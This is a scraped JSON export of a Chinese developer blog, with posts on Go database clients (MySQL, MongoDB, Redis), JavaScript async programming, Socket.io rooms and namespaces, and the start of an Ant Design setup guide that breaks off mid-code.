首先，我们先自定义一个 JSON 包。 123456789101112131415161718192021222324252627282930package JSONimport \"encoding/json\"func Stringify(v interface&#123;&#125;) string &#123; b, err := json.Marshal(v) if err != nil &#123; return err.Error() &#125; return string(b)&#125;func Parse(str string) map[string]interface&#123;&#125; &#123; var obj interface&#123;&#125; err := json.Unmarshal([]byte(str), &amp;obj) if err != nil &#123; var errorMap map[string]interface&#123;&#125; errorMap[\"error\"] = err.Error() return errorMap &#125; return ToMap(obj)&#125;func ToArray(obj interface&#123;&#125;) []interface&#123;&#125; &#123; return obj.([]interface&#123;&#125;)&#125;func ToMap(obj interface&#123;&#125;) map[string]interface&#123;&#125; &#123; return obj.(map[string]interface&#123;&#125;)&#125; 接着使用它： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( \"fmt\" JSON \"./json\")func main() &#123; type Item struct &#123; Text string `json:\"text\"` &#125; type Message struct &#123; Name string `json:\"name\"` Body string `json:\"body\"` Time string `json:\"time\"` List []Item `json:\"list\"` &#125; // 定义 str := JSON.Stringify(Message&#123; Name: \"小明\", Body: \"小熊猫\", Time: \"2017-10-22\", List: []Item&#123;Item&#123;\"星期一\"&#125;, Item&#123;\"星期二\"&#125;&#125;, &#125;) fmt.Println(str) // 解析 obj := JSON.Parse(`&#123; \"name\": \"小明\", \"body\": \"小熊猫\", \"time\": \"2017-10-22\", \"list\": [ &#123; \"text\": \"星期一\" &#125;, &#123; \"text\": \"星期二\" &#125; ] &#125;`) // 解析数组 list := JSON.ToArray(obj[\"list\"]) // 解析对象 item := JSON.ToMap(list[0]) fmt.Println(item[\"text\"]) // \"星期一\"&#125; 如果是数组，json.Unmarshal 解析出来的是一个 []interface{}，如果是对象解析出来的是一个 map[string]interface{}。 这种是没有定义模型的用法，实际上更多时候需要先定义模型。 比如： 12345678910111213141516171819202122232425262728293031323334353637383940414243func main() &#123; post := Post&#123; Id: 1, Content: \"Hello world!\", Author: Author&#123; Id: 2, Name: \"A\", &#125;, Comments: []Comment&#123; Comment&#123; Id: 3, Content: \"B\", Author: Author&#123; Id: 2, Name: \"A\", &#125;, &#125;, Comment&#123; Id: 4, Content: \"C\", Author: Author&#123; Id: 3, Name: \"B\", &#125;, &#125;, Comment&#123; Id: 5, Content: \"D\", Author: Author&#123; Id: 4, Name: \"C\", &#125;, &#125;, &#125;, &#125; str := Stringify(post) fmt.Println(str) var p Post json.Unmarshal([]byte(str), &amp;p) fmt.Println(p.Author.Id) // 2&#125; MysqlMysql 是一个关系型数据库管理系统，是最流行的关系式数据之一。Mysql 方面比较推荐的是使用 GO-MySQL 驱动。Go-Mysql 使用 Go 实现，非常轻巧快捷。 要求： Go v1.5+ MySQL（4.1+），MariaDB，Percona Server，Google CloudSQL 或 Sphinx（2.2.3+） 安装： 1go get github.com/go-sql-driver/mysql 基本使用123456789101112131415161718192021222324252627282930313233package mainimport ( \"database/sql\" \"fmt\" _ \"github.com/go-sql-driver/mysql\")func main() &#123; // 用户名，密码，数据库名 db, err := sql.Open(\"mysql\", \"root:root@/test\") if err != nil &#123; fmt.Println(err) return &#125; defer db.Close() rows, _ := db.Query(\"SELECT * FROM user\") // 查询 columns, _ := rows.Columns() // 属性名称 fmt.Println(columns) // 遍历结果集的每行数据 for rows.Next() &#123; var userId int var userName string // 需要引用 rows.Scan(&amp;userId, &amp;userName) fmt.Println(userId, userName) &#125;&#125; import 下划线（如：import _ &quot;hello/imp&quot;）的作用：当导入一个包时，该包下的文件里所有 init() 函数都会被执行，然而，有些时候我们并不需要把整个包都导入进来，仅仅是是希望它执行 init() 函数而已。这个时候就可以使用 import _ 引用该包。 在 user 表里有以下数据： 1234567+---------+---------+---------+| Field | id | name |+---------+---------+---------+| | 1 | 小美 || | 2 | 小操蛋 || | 3 | 小操 |+---------+---------+------ --+ 运行后，输出 user 表的数据： 1231 小美2 小操蛋3 小操 Insert &amp; Update &amp; Delete最好的方式是使用模版语法避免 SQL 注入，而不是直接使用字符串拼接。 1234567891011121314151617// 预操作stmt1, _ := db.Prepare(`INSERT user (id, name) values (?, ?)`)// 插入数据res1, _ := stmt1.Exec(4, \"小冻\")// 预操作stmt2, _ := db.Prepare(`UPDATE user SET name = ?, WHERE id = ?`)// 更新数据res2, _ := stmt2.Exec(\"新小冻\", 4)// 预操作stmt3, _ := db.Prepare(`DELETE FROM user WHERE id = ?`)// 删除数据res3, _ := stmt3.Exec(4)// 无聊输出一下，为了不报错fmt.Println(res1, res2, res3); db.Prepare 是模版语法构造函数，而 Exec 表示的是执行某个 SQL 语句，它接收的参数是 Prepare 里的 ? 顺序参数。如果可以尽量用存储方式，而不是在后端代码里参杂太多的 SQL 语句。 MongodbMongodb 是一个高性能，开源，无模式的文档型数据库。Mongodb 里推荐使用的是 mgo，它使用非常，性能优越，同时允许我们以惯用的方式配对 Go 和 Mongodb。 安装： 1go get gopkg.in/mgo.v2 基本使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( \"fmt\" \"gopkg.in/mgo.v2\" \"gopkg.in/mgo.v2/bson\")// 定义数据类型type User struct &#123; Name string `json:\"name\"` Age int `json:\"age\"`&#125;func main() &#123; // 连接 session, err := mgo.Dial(\"127.0.0.1:27017\") defer session.Close() if err != nil &#123; fmt.Println(err) return &#125; // 选择数据库 test，集合为 user user := session.DB(\"test\").C(\"user\") // 插入数据 user.Insert( &amp;User&#123;\"小明\", 20&#125;, &amp;User&#123;\"小动\", 19&#125;, ) // 创建一个空的 User，得到的是指针 res := new(User) // 相当于 findOne user.Find(bson.M&#123;\"name\": \"小明\"&#125;).One(res) fmt.Println(res) // &amp;&#123;小明 20&#125; // find iter := user.Find(bson.M&#123;&#125;).Iter() for iter.Next(&amp;res) &#123; fmt.Println(res) &#125; // update user.Update( bson.M&#123;\"name\": \"小明\"&#125;, bson.M&#123; \"$set\": bson.M&#123;\"name\": \"新小明\"&#125;, &#125;, ) // remove user.RemoveAll(bson.M&#123;\"age\": bson.M&#123;\"$gt\": 18&#125;&#125;)&#125; 链式写法12345678910iter := user.Find(bson.M&#123;\"name\": \"daa\"&#125;). Sort(). Skip(10). Limit(10). Iter()// 迭代for iter.Next(&amp;res) &#123; fmt.Println(res)&#125; 数据映射类似 json 那种映射关系，如果要想获取 _id 就需要把 _id 映射到 Id 上，Go 对小写开头的属性视为私有属性。 12345type User struct &#123; Id bson.ObjectId `json:\"_id\" bson:\"_id\"` Name string `json:\"name\" bson:\"name\"` Age int `json:\"age\" bson:\"age\"`&#125; 插入数据的时候需要手动添加 _id： 1234user.Insert( &amp;User&#123;bson.NewObjectId(), \"小明\", 20&#125;, &amp;User&#123;bson.NewObjectId(), \"小动\", 19&#125;,) 查询的时候就可以查到 _id 了： 12user.Find(bson.M&#123;\"name\": \"小明\"&#125;).One(res)fmt.Println(res) // &amp;&#123;ObjectIdHex(\"59e6a484a2e0872a90e49989\") 小明 20&#125; 一些坑爹的地方 蛋疼的文档，仅列出函数名与参数返回值，并没有示例。 API 与 Mongodb 的 API 参数不符。比如 update 只接收两个参数（query, update），而 Mongodb 的 update 有三个参数，第三个参数用来配置。如果想更新全部，则需要使用 updateAll。 func (c Collection) UpdateAll(selector interface{}, update interface{}) (info ChangeInfo, err error)在 Vscode 上按住 ctrl 后，单击函数名称就可以转跳到源码了。 除了 update 外，find 等 api 参数也与 Mongodb Api 不符合。 find 默认是不返回 _id 的与 Mongodb 默认返回 _id 相违，并且不支持第二个参数。 没有找到聚合（aggregate）的 API，不知是否支持。 只支持部分 Mongodb API。 RedisRedis 是一个高速缓存数据库，可基于内存亦可持久化的日志型、Key-Value 数据库。在 Redis 方面使用的是：redigo，一个 Go 语言实现的 Redis 客户端。 安装： 1go get github.com/garyburd/redigo/redis 基本使用使用 Do 函数，就像输入 redis 命令一样来操作。 12345678910111213141516171819202122232425262728293031323334353637package mainimport ( \"fmt\" Redis \"github.com/garyburd/redigo/redis\")func main() &#123; // 连接 redis server redis, err := Redis.Dial(\"tcp\", \"127.0.0.1:6379\") defer redis.Close() if err != nil &#123; fmt.Println(err) return &#125; // set redis.Do(\"set\", \"name\", \"red\") // get name, _ := Redis.String(redis.Do(\"get\", \"name\")) // lpush redis.Do(\"lpush\", \"redlist\", \"aaa\") redis.Do(\"lpush\", \"redlist\", \"bbb\") redis.Do(\"lpush\", \"redlist\", \"ccc\") // lrange values, _ := Redis.Values(redis.Do(\"lrange\", \"redlist\", \"0\", \"100\")) // 遍历输出 for _, v := range values &#123; fmt.Println(string(v.([]byte))) &#125; fmt.Println(name)&#125; 在上面我给 redis 的包，起了一个别名：Redis（个人喜好） 在取数据时，如果： value 的类型为 int，则用 Redis.Int 转换。 value 的类型为 string，则用 Redis.String 转换。 value 的类型为 json，则用 Redis.Byte 转换。 value 的类型为数组，则用 Redis.Values 转换。 管道1234567redis.Send(\"set\", \"color\", \"red\")redis.Send(\"get\", \"color\")// 刷新输出缓冲区的 redis 服务器redis.Flush()// 获得 Redis 服务器的一个答复redis.Receive()redis.Receive() 或者使用 exec： 12345redis.Send(\"multi\")redis.Send(\"incr\", \"foo\")redis.Send(\"incr\", \"bar\")res, _ := redis.Do(\"exec\")fmt.Println(res) // [1, 1] 发布与订阅使用 Send，Flush，Receive 方法实现 Pub/Sub 功能。 123456789101112131415161718192021222324// 订阅go func() &#123; redis.Send(\"subscribe\", \"news\") redis.Flush() for &#123; reply, _ := redis.Receive() // process pushed message &#125;&#125;()// 发布redis, err := Redis.Dial(\"tcp\", \"127.0.0.1:6379\")defer redis.Close()if err != nil &#123; fmt.Println(err) return&#125;for &#123; var msg string fmt.Scanln(&amp;msg) // 获取标准流输入 redis.Do(\"publish\", \"news\", msg) return&#125; 参考资料 https://github.com/go-sql-driver/mysql http://labix.org/mgo https://github.com/garyburd/redigo","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"},{"name":"数据持久化","slug":"数据持久化","permalink":"http://me.lizhooh.com/tags/数据持久化/"}]},{"title":"ES6：现在还是将来？","slug":"ECMAScript/ES6：现在还是将来？","date":"2017-10-18T14:17:39.000Z","updated":"2021-06-15T06:10:52.812Z","comments":true,"path":"/stories/2017/10/ECMAScript/ES6：现在还是将来？/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/ECMAScript/ES6：现在还是将来？/","excerpt":"事件循环 很多时候我都在想，现在还是将来？这是关于 Javascript（ES6）现在与将来的话题。 异步编程是 Javascript 比较常见的方式，程序中现在运行的部分和将来运行的部分之间的关系就是异步编程的核心。","text":"事件循环 很多时候我都在想，现在还是将来？这是关于 Javascript（ES6）现在与将来的话题。 异步编程是 Javascript 比较常见的方式，程序中现在运行的部分和将来运行的部分之间的关系就是异步编程的核心。 Javascript 程序总是有两个块：第一块是现在运行，下一块是将来运行。对于某个时刻来说，只有一个是现在执行，其余的则会在将来执行。这种关系会在下一个时刻发生变化，将来执行的终将会变为现在执行。 从现在到将来的“等待”，最简单的方法是使用一个通常称为回调函数的函数，等待将来的某个时刻来临时，就会调用执行这个函数，这也是最普遍的做法。 1234// 现在执行$.get('http://127.0.0.1:3000/api/user', function(res) &#123; // 将来执行&#125;); 要想表示将来，只需要把一段代码包装成一个函数，并指定它在响应某个事件（定时器，点击事件，Ajax 等）时执行，这样这个函数就会变成一个将来执行的函数，也就是说它“异步”了。 对于 Javascript 引擎来说，它并不是独立运行的，它运行在宿主环境中（浏览器，V8 等）。这些环境都有一个特点，即它们都提供一种机制来处理程序中多个块的执行，这种机制被称为事件循环（event loop） 事件循环它的结构类似队列，一旦有事件需要运行，事件循环就会启动，直到队列清空。事件循环的每一轮称为一个 tick。对于每个 tick 来说，在被添加时它会从队列尾进入，被调用时从队列头出去，而调用的函数就是每个将来块的“回调函数”。 可以使用下面的简单代码来表示事件循环： 123456789101112131415161718const eventLoop = []; // 事件队列let event;// 事件循环while (true) &#123; // 队列非空 if (eventLoop.length &gt; 0) &#123; // 出队 event = eventLoop.shift(); // 调用 try &#123; event(); &#125; catch(err) &#123; reportError(err); &#125; &#125;&#125; 由此看来，事件循环以排队的方式调用每一个 tick，把自身的工作分成一个个任务并顺序执行。 下面代码真的会在 1000 ms 输出时间吗？ 实际上输出了 1520 ms，并没有如期的在 1000 ms 输出。 12345678910111213// 现在执行setTimeout(() =&gt; &#123; // 将来执行 for (let i = 0; i &lt; 2e9; i++) &#123; &#125;&#125;, 0);// 现在执行const start = Date.now();setTimeout(() =&gt; &#123; // 将来执行 const end = Date.now(); console.log(`$&#123;end - start&#125; ms`);&#125;, 1000); 上面的第一个 setTimeout 占用了整个线程 500+ms，让整个事件循环推迟了 500+ms。 从微观的角度看，Javascript 一次只能处理一个事件，如果在队列中有等待的 tick，那么就会从队列头中取出下一个 tick 并执行，并且会等 tick 执行完成。通常没有抢占式的方式支持直接将其排到队首。 有一点要清楚的是：像 setTimeout（类似的还有点击事件，Ajax 等）一开始并没有把你的回调函数挂在事件循环队列中。它所做的是设定一个定时器，当定时器到时后，再把你的回调函数放在事件循环中，等待被调用执行。 使用 setTimeout(cb, 0) 进行异步调度，基本上的意思就是“把这个函数插入到当前事件循环队列的结尾处”。 异步，并行，并发术语异步，并行，并发经常被混为一谈，实际上它们的意义完全不同。异步是关于现在和将来的时间间隙，并行是关于能够同时发送的事情，并发是关于两个或更多事件链随时间的发展而交替执行。 并行与并发的区别，看起来像这样： 两个队列，一个Coffee机器，那是并发。两个队列，两个Coffee机器，那是并行。 并行最常见的工具就是进程与线程。进程和线程独立运行，并可能同时运行。 在 Javascript 里，单线程的事件循环是实现并发的一种形式。在 Nodejs 里 cluster 是实现并行的一种形式。（它让 Nodejs 运行在不同 CPU 上，从而实现了并行） 任务队列任务？在 ES6 中，有一个新的概念建立在事件循环队列之上，它就是：“任务队列”（task queue）。 任务队列，它是挂在事件循环队列中的每一个 tick 之后（尾部）的一个队列。通俗点说，事件循环队列类似于一个游乐园游戏，玩过了一个游戏之后，你需要重新排队才能再玩一次。而任务队列类似于玩过了游戏之后，插队接着继续玩（滑稽）。 这个特性带来的影响是 Promise 的异步特性，因为 Promise 的异步特性是基于任务队列而实现的。（后面会通过代码说明） 回调函数在没有 Promise 的时代，回调是 Javascript 中最基础的异步模式。 但是人们渐渐的发现使用回调会带来很多问题，比如回调地狱，毁灭金字塔，难以调试等。 1234567891011doA(function() &#123; doB(); doC(function() &#123; doD(function() &#123; doE(); &#125;); doF(); &#125;); doG();&#125;);doF(); 上面的代码，你可以第一眼就能知道运行顺序吗？（假设每个回调都是异步进行的）它的调用顺序是 A -&gt; F -&gt; B -&gt; C -&gt; G -&gt; D -&gt; F -&gt; E，这种嵌套代码，使得阅读起来非常困难，同时也带来了调试的困难。 其中很大的原因是，我们的大脑对于事情的计划是线性的，阻塞的，单线程的。但是回调表达异步流程的方式是非线性的，非顺序的，两者处于相反的方向，使得阅读起来非常困难。 PromisePromise的出生就是为了解决回调函数的痛点。那么什么是 Promise？ Promise 是一种对象类型，是 ES6 新增加的规范，目的是为异步操作提供统一接口。 在 Promise 里只有三种状态： pending （等待） fulfilled （完成） rejected （失败） 通过 new Promise 来创建一个 Promise 对象，这个 Promise 对象是具有 then 方法的鸭子类型。 在没有使用 Promise 之前，我们还是要写回调嵌套，代码看起来像是这样。 1234567doA(function() &#123; doB(function(a) &#123; doC(function(b) &#123; doD(c); &#125;) &#125;)&#125;) 现在，使用 Promise 可以以顺序的方式来处理异步问题，一切都变得非常自然。 1234doA .then((a) =&gt; doB(a)) .then((b) =&gt; doC(b)) .then((c) =&gt; doD(c)) 在 Promise 里可以使用它的构造函数创建一个 Promise 对象。 1234567891011const fs = require('fs');const readFile = (path) =&gt; new Promise((resolve, reject) =&gt; &#123; fs.readFile(path, (err, data) =&gt; &#123; err ? reject(err) : resolve(data); &#125;);&#125;);readFile('./test.js').then(data =&gt; &#123; console.log(data.toString());&#125;) 在上面，封装了一个 readFile 函数用来读取文件，调用它的时候将返回一个 Promise 对象。 Promise 的构造函数接收一个回调函数，很多时候看到回调函数就给人一种直觉认为它是将来时的。但是这个回调函数并不是将来时，它会立即执行并且阻塞当前线程的，它只是给你提供 resolve，reject 的上下文。 不信？试一下下面的代码，看看多久才输出 hello。 12345new Promise((resolve, reject) =&gt; &#123; for(let i = 0; i &lt; 3e9; i++) &#123; &#125;&#125;);console.log('hello'); 除了构造函数外，原生 Promise 还提供了一些方法： Promise.reject() 直接返回一个 reject 了的 Promise 对象 Promise.resolve() 直接返回一个 resolve 了的 Promise 对象 Promise.all([]) 接收一个数组，内容通常由 Promise 对象组成，并发的执行每个 Promise，顺序与开始指定的顺序一致，只有全部完成了才 resolve，否则 reject Promise.race([]) 接收一个数组，内容通常由 Promise 对象组成，并发的执行每个 Promise，顺序与开始指定的顺序一致，最快完成的就 resolve，有错误则 reject 除此之外，想要更多的功能，可以使用 Bluebird，一个高性能的 Promise 库。 Promise 与 任务队列在 Promise 里，它的构造函数的回调是同步进行的。 123456789new Promise((resolve, reject) =&gt; &#123; resolve(); console.log(1); for (let i = 0; i &lt; 1e9; i++) &#123; &#125;&#125;).then(() =&gt; &#123; console.log(2);&#125;)console.log(3); 上面的代码输出 1，3，2。表明 Promise 构造函数的回调函数是同步的，其次是，resolve() 并不会立刻执行 then，而是把 then 放入了当前 tick 的末尾，等待当前 tick 执行完成后再调用。 Promise 一旦决议，它就永远保持在这个状态。当 Promise 决议后，每一个 then 代表着一个 task，多个 then 组成了一个任务队列（task queue）。并且在合适的时候添加到当前 tick 的末尾。 下面的代码有两个块，一块是现在时（tick1），另一块是将来时（tick2），同时有两个任务队列（分别为 taskq1，taskq2）。 123456789101112131415161718192021222324setTimeout(() =&gt; console.log(1), 0);new Promise((resolve, reject) =&gt; &#123; resolve(); console.log(2); setTimeout(() =&gt; console.log(10), 0);&#125;).then(() =&gt; &#123; console.log(3);&#125;).then(() =&gt; &#123; console.log(4);&#125;);setTimeout(() =&gt; console.log(5), 0);new Promise((resolve, reject) =&gt; &#123; console.log(6); resolve();&#125;).then(() =&gt; &#123; console.log(7);&#125;).then(() =&gt; &#123; console.log(8);&#125;);console.log(9); 在这里是不是觉得会是输出：2、6、9、3、4、7、8、1、10、5。 正确的是：2、6、9、3、7、4、8、1、10、5。 可以看出，在一个tick里如果有多个任务队列，这时并不会等待某个任务队列执行完成后，再去执行其他任务队列。而是多个任务队列之间进行交替执行。 因此，可以利用 Promise 实现并发任务。 async，awaitasync，await 是 ES7 新增的内容，可以说是一个比较完美的异步流程解决方案（在 Nodejs v7.6 得到原生的支持）。 async，await 通常需要与 Promise 配合使用，await 需要等待一个 Promise，而 async 一个函数后，这个函数就会变成返回 Promise 对象。 123async function add(a, b) &#123; return a + b;&#125; 上面只是一个很普通的 add 函数，但是给它添加了 async 之后就变得不普通了。 12345678910// 无法以平常的方式输出console.log(add(1, 2)); // Promise// 要使用 thenadd(1, 2).then(res =&gt; console.log(res)); // 3// 或者(async () =&gt; &#123; console.log(await add(1, 2)); // 3&#125;)(); 因此，async 被誉为最快让一个函数变为 Promise 函数的语法。 await 常用来等待某个异步函数的完成。 1234567(async () =&gt; &#123; // 现在 await add(1, 2) // 将来 await add(3, 4) // 将来的将来&#125;)(); await 让你以顺序的思维写异步代码，同时也容易带来错觉。await 能够之后的代码块都将变成将来时，看起来就好像阻塞当前代码运行一样，实际上它是异步进行的。 使用 await 某个函数之后，这个函数将被添加到当前 tick 之后（尾部）的添加一个队列（每个 await 都是一个队列）。在等式左边 await 总是等待 Promise 的结果。 12345678910111213(async () =&gt; &#123; // 现在 const res = await add(1, 2) .then(res =&gt; &#123; console.log('a'); return res; &#125;).then(res =&gt; &#123; console.log('b'); return res; &#125;); console.log(res);&#125;)(); 上面代码输出的是 a b 3，可以看出 await 左边的结果最后才返回。 小结 Javascript 程序总是分为两个块：第一块现在运行，下一块将来运行，以响应某个时间。 在任意时刻，事件循环一次只能从队列中处理一个事件，在执行时有可能直接或间接的引发一个或多个后续事件，这些事件将被添加到队列末尾。 并发是指两个或多个事件链随时间发展交替执行。从更高的层次来看，就像是同时在运行一样。 回调函数是 Javascript 异步编程的基本单元，现在已有更好的方式取代回调。 每个 Promise 链都是一个任务队列，并且添加到当前 tick 的末尾，它的 then 会在多个任务队列之间进行交替执行。 Async，Await 是目前最好的异步编程语法，它提供顺序的思维来编写异步代码。 参考资料 《你不知道的 Javascript 中卷》[美] Kyle Simpson，第二部分：异步与性能 《Nodejs 深入浅出》朴灵 《JavaScript异步编程：设计快速响应的网络应用》 (美) 伯纳姆 http://www.ruanyifeng.com/blog/2014/10/event-loop.html https://zhuanlan.zhihu.com/p/25407758","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"深入理解 Socket.io 中的 Room 与 Namespace","slug":"Nodejs/深入理解 Socket.io 中的 Room 与 Namespace","date":"2017-10-16T14:50:30.000Z","updated":"2021-06-15T06:10:52.846Z","comments":true,"path":"/stories/2017/10/Nodejs/深入理解 Socket.io 中的 Room 与 Namespace/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Nodejs/深入理解 Socket.io 中的 Room 与 Namespace/","excerpt":"房间与命名空间的关系在 Socket.io 里有房间与命名空间这么两个概念与结构。房间与命名空间都能实现 websocket 的多路复用，但是它们有一定的区别。 当 websocket 连接后，socket 会属于某个房间，还会属于某个命名空间。socket 与 room，namespace 的关系就像是个人，房子，地区的关系。 它们的关系如下图，每个 Namespace 里会有很多 Room，Room 里又会有很多 socket。","text":"房间与命名空间的关系在 Socket.io 里有房间与命名空间这么两个概念与结构。房间与命名空间都能实现 websocket 的多路复用，但是它们有一定的区别。 当 websocket 连接后，socket 会属于某个房间，还会属于某个命名空间。socket 与 room，namespace 的关系就像是个人，房子，地区的关系。 它们的关系如下图，每个 Namespace 里会有很多 Room，Room 里又会有很多 socket。 命名空间（Namespace）连接的时候，使用路径名来指定命名空间。在没有指定命名空间下，默认会使用 / 作为命名空间。如果要想指定命名空间，则需要在客户端指定：/news，这样就指明进入的是 /news 命名空间。 客户端指定命名空间： 12const socket = io('/news');// or io.connect('http://localhost/namespace') 在服务端里对应的处理，则需要使用 of： 1234567891011const io = require('socket.io')();// news 命令空间const news = io.of('/news');news.on('connection', function(socket) &#123; console.log('someone connected');&#125;);// 只在本命名空间发送消息news.emit('hi', 'everyone!'); io 在创建是，它就会被指派到默认的命名空间 /，那么它的广播只限于在 / 里的 socket 才收到，其他空间里是收不到消息的。 1234const io = require('socket.io')();io.send('!!!');io.broadcast.emit('!!!'); 也可以从默认空间里去到其他空间里发消息： 1234// 去到 /news 里发消息io.of('/news').send('!!!');// 去到 /news 里的 room1 房间里发消息io.of('/news').to('room1').send('!!!'); 只有命名空间才有权力去到另一个命名空间发消息： 1234// 下面代码是错误的io.on('connection', function(socket) &#123; socket.of('/news');&#125;); socket 只能换房间，不能去到另一个命名空间。 在命名空间里广播有些差异性： 12io.sockets.emit('!!!'); // 默认命名空间，广播方式news.emit('!!!'); // 非默认命名空间，广播方式 在连接时，如果指定了命名空间，也会进入到默认空间里： 1234567io.on('connection', (socket) =&gt; &#123; console.log(`[/ 欢迎] $&#123;socket.id&#125;`);&#125;);news.on('connection', (socket) =&gt; &#123; console.log(`[/news 欢迎] $&#123;socket.id&#125;`);&#125;); 上面代码，当一个客户端连接时，出现输出两次欢迎，并且拥有相同的 id。 12[/ 欢迎] qTrAe97j9cNI4VYMAAAA[/news 欢迎] /video#qTrAe97j9cNI4VYMAAAA 此外连接事件可以多次监听： 1234567io.on('connection', (socket) =&gt; &#123; console.log(`[/ 欢迎1] $&#123;socket.id&#125;`);&#125;);io.on('connection', (socket) =&gt; &#123; console.log(`[/ 欢迎2] $&#123;socket.id&#125;`);&#125;); 上面代码输出两次欢迎，并且有先后顺序（1 -&gt; 2） 房间（Room）对于房间的进入与离开，可以使用 join 与 leave。 123456io.on('connection', function(socket) &#123; // 把 socket 扔进 room1 房间里 socket.join('room1'); // 再把 socket 赶出 room1 房间 socket.leave('room1');&#125;); 每个房间只属于某个命名空间，因此可以收听同一个命令空间的消息。而不同的房间之间是隔离的，它们不能接收不同房间的消息。 使用 to/in （它们是一样的）来对某个房间进行广播消息。 12io.to('room1').emit('some event');socket.to('room1').to('room2').emit('hello'); 当连接时，默认会指派到一个唯一的房间，也就是用 socket.id 来命名的房间。这样的做法是让每个 socket 待在自己的房间里不受到其他人影响。 这样可以轻松地向其他 socket 广播消息： 123456io.on('connection', function(socket) &#123; // id 是某个 socket.id，相当于去到他的房间里叫他 socket.on('say to someone', function(id, msg) &#123; socket.broadcast.to(id).emit('my message', msg); &#125;&#125;); socket 可以进入多个房间接收信息，相当于你可以在 QQ 上加入多个群一样。可以使用 rooms 来查看，当前 socket 所在的房间。 123456io.on('connection', (socket) =&gt; &#123; socket.join('room 237', () =&gt; &#123; let rooms = Objects.keys(socket.rooms); console.log(rooms); // [ &lt;socket.id&gt;, 'room 237' ] &#125;);&#125;); 如何从 url 判断房间与命名空间？假设 url = /news/room1，其中 news 是命名空间，room1 是房间。命名空间自动分配不用管，而房间需要我们自己去分配。 1234567891011121314151617const io = require('socket.io')();// news 命令空间const news = io.of('/news');news.on('connection', function (socket) &#123; // http://127.0.0.1:3000/news/room1 const url = socket.request.url; // 获取房间 id，也就是 room1 const room = url.match(/\\/\\w+$/).toString(); // 进入房间 socket.join(room, () =&gt; &#123; let rooms = Objects.keys(socket.rooms); console.log(rooms); // [ &lt;socket.id&gt;, 'room1' ] &#125;);&#125;); 也可以使用 query，这是最简单的方式。 12// http://127.0.0.1:3000/news?r=room1const room = socket.handshake.query['r']; 轻易实现群聊与私聊利用命名空间与房间的特性，可以轻易的实现群聊与私聊。 对于群聊，你只需要把每个 socket 扔进同一个房间即可。对于私聊，你只需要把两个 socket 扔进同一个房间即可。 小结socket.io 的 API 是对称的，所以适用于服务端的操作也适用于客户端。房间与命名空间的区别可以用这幅图来理解。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"React 中使用 Ant Design 轻指南","slug":"React/Ant-design/React 中使用 Ant Design 轻指南","date":"2017-10-12T04:06:12.000Z","updated":"2021-06-15T06:10:52.871Z","comments":true,"path":"/stories/2017/10/React/Ant-design/React 中使用 Ant Design 轻指南/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/React/Ant-design/React 中使用 Ant Design 轻指南/","excerpt":"Ant DesignAnt Design 不止是一种设计语言，更是一个优秀的 UI 库，并且是 React 技术栈的。 它有以下特性： 提炼自企业级中后台产品的交互语言和视觉风格。 开箱即用的高质量 React 组件。 使用 TypeScript 构建，提供完整的类型定义文件。 基于 npm + webpack + babel 的工作流，支持 ES2015 和 TypeScript。 因为要用到 Antd，赶紧爬一下坑先。","text":"Ant DesignAnt Design 不止是一种设计语言，更是一个优秀的 UI 库，并且是 React 技术栈的。 它有以下特性： 提炼自企业级中后台产品的交互语言和视觉风格。 开箱即用的高质量 React 组件。 使用 TypeScript 构建，提供完整的类型定义文件。 基于 npm + webpack + babel 的工作流，支持 ES2015 和 TypeScript。 因为要用到 Antd，赶紧爬一下坑先。 环境配置这里介绍是使用 create-react-app 创建的项目。 安装依赖：12npm install --save antdnpm install --save-dev babel-plugin-import react-app-rewired 说明： react-app-rewired 是用来覆盖 webpack 配置的。 babel-plugin-import 是异步加载组件 import() 插件。 修改 npm scripts： 123456/* package.json */\"scripts\": &#123; \"start\": \"react-app-rewired start\", \"build\": \"react-app-rewired build\", \"test\": \"react-app-rewired test --env=jsdom\",&#125; 然后在项目根目录创建一个config-overrides.js用于修改默认配置，添加异步加载功能 import()： 1234567const &#123; injectBabelPlugin &#125; = require('react-app-rewired');module.exports = function override(config, env) &#123; // 修改一些配置 config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: 'css' &#125;], config); return config;&#125;; 配置别名路径create-react-app 默认是不加别名的。可以给它加个别名，并重新配置 autoprefixer 等级。 12345678910111213141516171819202122const path = require('path');const autoprefixer = require('autoprefixer');// 加个别名路径config.resolve.alias = &#123; ...config.resolve.alias, '@': path.join(__dirname, './src'),&#125;;// autoprefixer 等级config.module.rules[1].oneOf[3].use[2].options.plugins = () =&gt; [ require('postcss-flexbugs-fixes'), autoprefixer(&#123; browsers: [ '&gt;5%', 'last 4 versions', 'Firefox ESR', 'not ie &lt; 11', // React 16 doesn't support IE11 anyway ], flexbox: 'no-2009', &#125;),]; 配置 Sass一般来说我会选择使用 Scss，而不是 Less。Less 有些语法真的不好用。在 config.override.js 里添加函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// sass buildconst colors = require('colors');const path = require('path');const fs = require('fs');const cp = require('child_process');const ck = require('chokidar');const sass = require('node-sass');function time() &#123; const d = new Date(); return `[$&#123;d.toString().match(/\\d&#123;2&#125;:\\d&#123;2&#125;:\\d&#123;2&#125;/)&#125; 